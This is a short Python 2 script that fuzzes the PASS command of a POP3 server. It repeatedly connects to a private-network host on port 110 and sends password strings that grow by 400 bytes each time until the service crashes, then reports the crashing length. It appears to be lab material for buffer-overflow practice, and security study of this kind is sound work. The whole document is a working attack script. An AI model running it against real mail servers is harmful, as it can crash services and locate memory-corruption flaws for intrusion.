#!/usr/bin/python
 
import sys, socket
from time import sleep
 
buffer = "A" * 100

while True:
	try:
		
        	
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.10.91', 110))
		data = s.recv(1024)

	        s.send('USER admin ' + '\r\n')
	        data = s.recv(1024)
		print "Fuzzing PASS with %s bytes" % str(len(buffer))
	        s.send(('PASS ' + buffer + '\r\n'))
	        data = s.recv(1024)
		buffer = buffer + "A"*400
		s.close()
	        
		                
	except:        
		print "\nFuzzing crashed at %s bytes" % str(len(buffer))
	        sys.exit()
